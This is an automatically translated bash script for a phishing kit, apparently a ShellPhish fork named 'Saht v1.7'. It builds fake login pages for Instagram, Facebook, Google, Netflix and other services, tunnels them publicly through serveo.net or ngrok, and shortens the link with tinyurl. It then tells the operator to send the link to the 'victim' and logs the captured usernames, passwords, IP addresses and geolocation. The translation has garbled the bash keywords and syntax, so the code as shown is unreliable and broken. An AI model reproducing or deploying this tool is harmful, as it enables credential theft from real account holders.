#! / bin / bash
# Saht v1.7
# Coded by: saviorangelhackteam (Sadece kredileri değiştirerek kodlayıcı olmazsınız)
# Github:

tuzak  ' printf "\ n"; dur; çıkış 1 ' 2


bağımlılıklar () {

komut -v php > / dev / null 2> & 1  || { echo  > & 2  " PHP'ye ihtiyacım var ama yüklü değil. Yükle. İptal ediliyor. " ;  çıkış 1 ; }
komut -v curl > / dev / null 2> & 1  || { echo  > & 2  " Kıvrılmaya ihtiyacım var ama kurulmadı. Kur. Durdurma. " ;  çıkış 1 ; }

}

menü () {

printf  " \ e [1; 92m [\ e [0m \ e [1; 77m01 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Instagram \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m09 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Menşei \ e [0m \ e [1; 92m [\ e [0m \] e [1; 77m17 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Gitlab \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m02 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Facebook \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m10 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Steam \ e [0m \ e [1; 92m [\ e [0m \] e [1; 77m18 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Pinterest \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m03 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Snapchat \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m11 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Yahoo \ e [0m \ e [1; 92m [\ e [0m \] e [1; 77m19 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Özel \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m04 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Twitter \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m12 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Linkedin \ e [0m \ e [1; 92m [\ e [0m \] e [1; 77m99 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Çık \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m05 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Github \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m13 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Protonmail \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m06 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Google \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m14 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Wordpress \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m07 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Spotify \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m15 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Microsoft \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m08 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Netflix \ e [0m \ e [1; 92m [\ e [0m \ e [1; 77m16 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m InstaTakipçiler \ e [0m \ n "
okumak -p $ ' \ n \ e [1; 92m [ \ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] bir seçenek belirleyin: \ e [0m \ e n ' seçeneği


eğer [[ $ option  == 1 ||  $ seçenek  == 01]] ;  sonra
server = " instagram "
fonksiyonu1

elif [[ $ option  == 2 ||  $ seçenek  == 02]] ;  sonra
server = " facebook "
fonksiyonu1
elif [[ $ option  == 3 ||  $ seçenek  == 03]] ;  sonra
server = " snapchat "
fonksiyonu1
elif [[ $ option  == 4 ||  $ seçenek  == 04]] ;  sonra
server = " twitter "
fonksiyonu1
elif [[ $ option  == 5 ||  $ seçenek  == 05]] ;  sonra
server = " github "
fonksiyonu1
elif [[ $ option  == 6 ||  $ seçenek  == 06]] ;  sonra
server = " google "
fonksiyonu1

elif [[ $ option  == 7 ||  $ seçenek  == 07]] ;  sonra
server = " spotify "
fonksiyonu1

elif [[ $ option  == 8 ||  $ seçenek  == 08]] ;  sonra
server = " netflix "
fonksiyonu1

elif [[ $ option  == 9 ||  $ seçenek  == 09]] ;  sonra
server = " kaynak "
fonksiyonu1

elif [[ $ option  == 10]] ;  sonra
server = " buhar "
fonksiyonu1

elif [[ $ option  == 11]] ;  sonra
server = " yahoo "
fonksiyonu1

elif [[ $ option  == 12]] ;  sonra
server = " linkedin "
fonksiyonu1

elif [[ $ option  == 13]] ;  sonra
server = " protonmail "
fonksiyonu1

elif [[ $ option  == 14]] ;  sonra
server = " wordpress "
fonksiyonu1

elif [[ $ option  == 15]] ;  sonra
server = " microsoft "
fonksiyonu1

elif [[ $ option  == 16]] ;  sonra
server = " instafollowers "
fonksiyonu1

elif [[ $ option  == 17]] ;  sonra
server = " gitlab "
fonksiyonu1

elif [[ $ option  == 18]] ;  sonra
server = " pinterest "
fonksiyonu1

elif [[ $ option  == 19]] ;  sonra
server = " create "
sayfa oluştur
fonksiyonu1

elif [[ $ option  == 99]] ;  sonra
çıkış 1

Başka
printf  " \ e [1; 93m [!] Geçersiz seçenek! \ e [0m \ n "
uyku 1
açık
Menü
fi
}

dur () {

checkngrok = $ ( ps aux | grep -o " ngrok "  | head -n1 )
checkphp = $ ( ps aux | grep -o " php "  | head -n1 )
checkssh = $ ( ps aux | grep -o " ssh "  | head -n1 )
eğer [[ $ checkngrok  ==  * ' ngrok ' * ]] ;  sonra
pkill -f -2 ngrok > / dev / null 2> & 1
killall -2 ngrok > / dev / null 2> & 1
fi
eğer [[ $ checkphp  ==  * ' php ' * ]] ;  sonra
pkill -f -2 php > / dev / null 2> & 1
killall -2 php > / dev / null 2> & 1
fi
eğer [[ $ checkssh  ==  * ' ssh ' * ]] ;  sonra
pkill -f -2 ssh > / dev / null 2> & 1
killall ssh > / dev / null 2> & 1
fi
eğer [[ -e sendlink]] ;  sonra
rm -rf sendlink
fi

}

banner () {

printf  " \ e [1; 77m _________ _____ _ _ ______________ \ e [0m \ n "
printf  " \ e [1; 77m | ________) - / / \ \ - - | | | | (______________) \ e [0m \ n "
printf  " \ e [1; 77m | | - / / \ \ - | | | | | | | \ e [0m \ n "
printf  " \ e [1; 77m | | ________ - / / \ \ - - | | ________ | | | \ e [0m \ n "
printf  " \ e [1; 77m | _________ | - / / _______ \ \ - | | ________ | | | | e [0m \ n "
printf  " \ e [1; 77m | | - / / _________ \ \ - - | | | | | \ e [0m \ n "
printf  " \ e [1; 77m ________ | | - / / \ \ - - | | | | | | e [0m \ n "
printf  " \ e [1; 77m (__________ | - / / \ \ - - _ _ | _ | _ | _ | v1.7 \ e [0m \ n ")
printf  " \ n "
printf  " \ e [1; 93m.:.:. \ e [0m \ e [1; 77m Kimlik Avı Aracı tarafından kodlanan: mr.Bomba \ e [0m \ e [1; 93m.:.:. \ e [0m \ n "
printf  " \ n "
printf  "   \ e [101m \ e [1; 77m :: Sorumluluk reddi: Geliştiriciler sorumluluk kabul etmez ve değildir :: \ e [0m \ n "
printf  "   \ e [101m \ e [1; 77m :: ShellPhish'in neden olduğu herhangi bir yanlış kullanım veya zarardan sorumludur :: \ e [0m \ n "
printf  " \ n "
}

createpage () {
default_cap1 = " Wi-fi Oturumunun Süresi Doldu "
default_cap2 = " Lütfen tekrar giriş yapın. "
default_user_text = " Kullanıcı adı: "
default_pass_text = " Şifre: "
default_sub_text = " Giriş "

oku -p $ ' \ e [1; 92m [ \ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Başlık 1 (Varsayılan: Wi-fi Seansının Süresi Bitti): \ e [0m ' cap1
cap1 = " $ {cap1 : - $ {default_cap1} } "

okumak -p $ ' \ e [1; 92m [ \ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Başlık 2 (Varsayılan: tekrar giriş yapın.): \ e [0m ' CAP2
cap2 = " $ {cap2 : - $ {default_cap2} } "

okumak -p '$ \ e ; 92m [[1 \ e [0m \ e [1; 77m * \ e [0m \ e : Kullanıcı Adı :) [1 92m] Kullanıcı adı alanı (Varsayılan e \ [0m ' user_text
user_text = " $ {user_text : - $ {default_user_text} } "

okumak -p '$ \ e ; 92m [[1 \ e [0m \ e [1; 77m * \ e [0m \ e : Şifre :) [1 92m] Şifre alanını (Varsayılan \ e [0m ' pass_text
pass_text = " $ {pass_text : - $ {default_pass_text} } "

oku -p $ ' \ e [1; 92m [ \ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Alan gönder (Varsayılan: Giriş Yap): \ e [0m ' sub_text
sub_text = " $ {sub_text : - $ {default_sub_text} } "

echo  " <! DOCTYPE html> "  > sites / create / login.html
echo  " <html> "  >> sites / create / login.html
echo  " <body bgcolor = \" grey \ " text = \" beyaz \ " > "  >> siteler / create / login.html
IFS = $ ' \ n '
printf  ' <center> <h2>% s <br> <br>% s </h2></center> <center> \ n '  $ cap1  $ cap2  >> sites / create / login.html
IFS = $ ' \ n '
printf  ' <form method = "POST" eylem = "login.php"> <label>% s </label> \ n '  $ user_text  >> sites / create / login.html
IFS = $ ' \ n '
printf  ' <input type = "text" name = "kullanıcı adı" uzunluk = 64> \ n '  >> siteler / create / login.html
IFS = $ ' \ n '
printf  ' <br> <label>% s: </label> '  $ pass_text  >> sites / create / login.html
IFS = $ ' \ n '
printf  ' <input type = "password" name = "password" uzunluk = 64> <br> <br> \ n '  >> sites / create / login.html
IFS = $ ' \ n '
printf  ' <input value = "% s" type = "  send  "> </form> \ n ' $ sub_text >> siteler / create / login.html
printf  ' </center> '  >> sites / create / login.html
printf  ' <body> \ n '  >> siteler / create / login.html
printf  ' </html> \ n '  >> sites / create / login.html


}

catch_cred () {

hesap = $ ( grep -o ' Hesap :. * ' sites / $ server /usernames.txt | cut -d "  " -f2 )
IFS = $ ' \ n '
şifre = $ ( grep -o ' Geçiş :. * ' sites / $ server /usernames.txt | cut -d " : " -f2 )
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Hesap: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ hesap
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] \ e [0m \ e [1; 92m Şifre: \ e [0m \ e [ 1; 77m% s \ n \ e [0m "  $ şifre
kedi siteleri / $ server / usernames.txt >> sites / $ server / usner.usernames.txt
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Kayıtlı: \ e [0m \ e [1; 77m site /% s / kaydedildi. usernames.txt \ e [0m \ n "  $ sunucu
printf  " \ n "
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Sonraki IP ve Sonraki Kimlik Bilgilerini Bekliyor, çıkmak için Ctrl + C tuşlarına basın ... \ e [ 0m \ n "

}


catch_ip () {
sitelere / $ server /saved.usernames.txt adresine dokunun
ip = $ ( grep -a ' IP: ' siteler / $ server /ip.txt | cut -d "  " -f2 | tr -d ' \ r ' )
IFS = $ ' \ n '
ua = $ ( grep ' Kullanıcı-Ajan: ' sites / $ server /ip.txt | cut -d ' " ' -f2 )
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Kurban IP: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Kullanıcı Ajanı: \ e [0m \ e [1; 77m% s \ e [ 0m \ n "  $ ua
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Kayıtlı: \ e [0m \ e [1;% 77m s / saved.ip. txt \ e [0m \ n "  $ sunucu
kedi siteleri / $ server /ip.txt >> sites / $ server /saved.ip.txt

if [[ -e iptracker.log]] ;  sonra
rm -rf iptracker.log
fi

IFS = ' \ n '
iptracker = $ ( curl -s -L " www.ip-tracker.org/locator/ip-lookup.php?ip= $ ip " - kullanıcı aracı " Mozilla / 5.0 (X11; Linux x86_64) AppleWebKit / 537.31 ( KHTML, Gecko gibi) Chrome / 26.0.1410.63 Safari / 537.31 "  > iptracker.log )
IFS = $ ' \ n '
continent = $ ( grep -o ' Continent. * ' iptracker.log | head -n1 | cut -d " > " -f3 | cut -d " < " -f1 )
printf  " \ n "
hostnameip = $ ( grep -o " </td></tr><tr> <th> Ana Bilgisayar Adı :. * " iptracker.log | cut -d " < " -f7 | cut -d " > " -f2 )
if [[ $ hostnameip  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] Ana bilgisayar adı: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ hostnameip
fi
# #

reverse_dns = $ ( grep -a " </td></tr><tr> <th> Ana Bilgisayar Adı :. * " iptracker.log | cut -d " < " -f1 )
eğer [[ $ $ reverse_dns  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] Ters DNS: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ reverse_dns
fi
# #


eğer [[ $ continent  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] IP Kıtası: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ kıta
fi
# #

country = $ ( grep -o ' Ülke :. * ' iptracker.log | cut -d " > " -f3 | cut -d " & " -f1 )
if [[ $ country  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] IP Ülkesi: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ülke
fi
# #

state = $ ( grep -o " izleme lessimpt. * " iptracker.log | cut -d " < " -f1 | cut -d " > " -f2 )
eğer [[ $ state  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] Durum: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ durum
fi
# #
city ​​= $ ( grep -o " Şehir Konumu :. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )

if [[ $ city  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] Şehir Konumu: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ şehir
fi
# #

isp = $ ( grep -o " ISS :. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
eğer [[ $ isp  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] ISS: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ isp
fi
# #

as_number = $ ( grep -o " AS Numarası :. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
if [[ $ as_number  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] AS Numarası: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ as_number
fi
# #

ip_speed = $ ( grep -o " IP Adres Hızı :. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )
eğer [[ $ ip_speed  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] IP Adresi Hızı: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip_speed
fi
# #
ip_currency = $ ( grep -o " IP Para Birimi :. * " iptracker.log | cut -d " < " -f3 | cut -d " > " -f2 )

if [[ $ ip_currency  ! =  " " ]] ;  sonra
printf  " \ e [1; 92m [*] IP Para Birimi: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ ip_currency
fi
# #
printf  " \ n "
rm -rf iptracker.log
printf  " \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Kimlik Bilgilerini Bekliyor ve Sonraki IP, Çıkmak için Ctrl + C tuşlarına basın ... \ e [0m \ n "

}


serverx () {
printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] php sunucusu başlatılıyor ... \ n "
cd siteleri / $ sunucusu  && php -S 127.0.0.1: $ portu  > / dev / null 2> & 1  & 
uyku 2
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Sunucu başlatılıyor ... \ e [0m \ n "
-v ssh komutu > / dev / null 2> & 1  || { echo  > & 2  " SSH'ye ihtiyacım var ama yüklü değil. Yükle. İptal ediliyor. " ;  çıkış 1 ; }
eğer [[ -e sendlink]] ;  sonra
rm -rf sendlink
fi
$ ( ki sh ) -c ' ssh -o StrictHostKeyChecking = hayır -o SunucuAliveInterval = 60 -R80: localhost: ' $ port ' serveo.net 2> / dev / null> sendlink '  &
printf  " \ n "
10 uyku
send_link = $ ( grep -o " https: // [0-9a-z] * \. serveo.net " sendlink )
printf  " \ n "
printf  ' \ n \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Hedefe doğrudan bağlantı gönder: \ e [0m \ e [1; 77m % s \ n '  $ send_link
send_ip = $ ( curl -s http://tinyurl.com/api-create.php ? url = $ send_link  | head -n1 )
printf  ' \ n \ e [1; 93m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 93m] Veya tinyurl kullanarak: \ e [0m \ e [1; 77m% s \ n '  $ send_ip
printf  " \ n "
checkfound


}

startx () {
if [[ -e siteler / $ server /ip.txt]] ;  sonra
rm -rf siteleri / $ server /ip.txt

fi
if [[ -e siteler / $ server /usernames.txt]] ;  sonra
rm -rf sites / $ server / usernames.txt

fi

default_port = " 3333 "  # $ (sıra 1111 4444 | sort -R | head -n1)
printf  ' \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Bir Bağlantı Noktası Seçin (Varsayılan: \ e [0m \ e [1; 77m% s \ e [0m \ e [1; 92m): \ e [0m '  $ default_port
portu oku
port = " $ {port : - $ {default_port} } "
ServerX

}


start () {
if [[ -e siteler / $ server /ip.txt]] ;  sonra
rm -rf siteleri / $ server /ip.txt

fi
if [[ -e siteler / $ server /usernames.txt]] ;  sonra
rm -rf sites / $ server / usernames.txt

fi



eğer [[ -e ngrok]] ;  sonra
yankı  " "
Başka
-v unzip komutu > / dev / null 2> & 1  || { echo  > & 2  " Sıkıştırılmış dosya açmam gerekiyor, ancak kurulu değil. Yükle. İptal ediliyor. " ;  çıkış 1 ; }
komut -v wget > / dev / null 2> & 1  || { echo  > & 2  " Yazmaya ihtiyacım var ama yüklü değil. Kur. İptal Et. " ;  çıkış 1 ; }
printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Ngrok indiriliyor ... \ n "
arch = $ ( uname -a | grep -o ' arm '  | head -n1 )
arch2 = $ ( uname -a | grep -o ' Android '  | head -n1 )
eğer [[ $ arch  ==  * ' arm ' * ]] || [[ $ arch2  ==  * ' Android ' * ]] ;  sonra
https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > / dev / null 2> & 1

eğer [[ -e ngrok-stable-linux-arm.zip]] ;  sonra
unzip ngrok-stable-linux-arm.zip > / dev / null 2> & 1
chmod + x ngrok
rm -rf ngrok-stable-linux-arm.zip
Başka
printf  " \ e [1; 93m [!] İndirme hatası ... Termux, çalıştır: \ e [0m \ e [1; 77m pkg kurulum wget \ e [0m \ n "
çıkış 1
fi



Başka
https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > / dev / null 2> & 1 
eğer [[ -e ngrok-stable-linux-386.zip]] ;  sonra
ngrok-stable-linux-386.zip sıkıştırmasını açın > / dev / null 2> & 1
chmod + x ngrok
rm -rf ngrok-stable-linux-386.zip
Başka
printf  " \ e [1; 93m [!] İndirme hatası ... \ e [0m \ n "
çıkış 1
fi
fi
fi

printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] php sunucusu başlatılıyor ... \ n "
cd siteleri / $ sunucusu  && php -S 127.0.0.1:3333 > / dev / null 2> & 1  & 
uyku 2
printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] ngrok sunucusu başlatılıyor ... \ n "
./ngrok http 3333 > / dev / null 2> & 1  &
10 uyku

link = $ ( curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o " https: // [0-9a-z] * \. ngrok.io " )
printf  " \ e [1; 92m [\ e [0m * \ e [1; 92m] Bu linki Kurban'a gönder: \ e [0m \ e [1; 77m% s \ e [0m \ n "  $ link
checkfound
}

start1 () {
eğer [[ -e sendlink]] ;  sonra
rm -rf sendlink
fi


printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m01 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Serveo.net (SSH Tüneli, En iyi!) \ e [0m \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m02 \ e [0m \ e [1; 92m] \ e [0m \ e [1; 93m Ngrok \ e [0m \ n ")
default_option_server = " 1 "
okumak -p $ ' \ n \ e [1; 92m [ \ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] Bir Port Yönlendirme seçenek belirleyin: \ e [0m \ e n ' option_server
option_server = " $ {option_server : - $ {default_option_server} } "
eğer [[ $ option_server  == 1 ||  $ option_server  == 01]] ;  sonra
startx

elif [[ $ option_server  == 2 ||  $ option_server  == 02]] ;  sonra
başla
Başka
printf  " \ e [1; 93m [!] Geçersiz seçenek! \ e [0m \ n "
uyku 1
açık
fonksiyonu1
fi

}
checkfound () {

printf  " \ n "
printf  " \ e [1; 92m [\ e [0m \ e [1; 77m * \ e [0m \ e [1; 92m] IPs ve Kimlik Bilgilerini Bekliyor, \ e [0m \ e [1; 77m Ctrl + C tuşlarına basın çıkmak için ... \ e [0m \ n "
iken [ doğru ] ;  yap


if [[ -e  " siteler / $ server /ip.txt " ]] ;  sonra
printf  " \ n \ e [1; 92m [\ e [0m * \ e [1; 92m] IP Bulundu! \ n "
catch_ip
rm -rf siteleri / $ server /ip.txt
fi
0,5 uyu
eğer [[ -e  " siteler / $ server / usernames.txt " ]] ;  sonra
printf  " \ n \ e [1; 93m [\ e [0m * \ e [1; 93m] \ e [0m \ e [1; 92m Kimlik Bilgisi Bulundu! \ n "
catch_cred
rm -rf sites / $ server / usernames.txt
fi
0,5 uyu


tamam 

}
afiş
bağımlılıklar
Menü
